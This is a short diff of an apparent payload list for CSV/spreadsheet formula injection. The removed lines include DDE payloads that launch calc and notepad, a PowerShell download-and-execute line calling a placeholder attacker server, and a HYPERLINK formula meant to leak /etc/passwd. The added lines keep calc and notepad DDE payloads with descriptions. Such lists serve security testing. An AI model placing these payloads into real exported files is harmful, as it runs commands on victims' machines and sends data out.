@@ -1,6 +1,3 @@
-DDE ("cmd"" calc";"!A")A0,first
-SUM()*cmd|'  calc'!A,second
-0+cmd|'  calc'!A0,third
-cmd|'  notepad'!'A',fourth
-cmd|' powershell IEX(wget attacker_servershell)'!A,fifth
-HYPERLINK(CONCATENATE("http:/.0.0.0:0/.txt?v=" ('file:///etc/passwd'#$passwd.A1)); "testpoc"),sixth
+cmd|' /C calc'!A0,to open the calculator application on the target machine (calculator automatic open command)
+"HYPERLINK('https://www.google.com', 'Google')",hyperlink function in excel
+cmd|' /C notepad'!'A1',to open the notepad application on excel/csv on the target machine (notepad automatic open command)
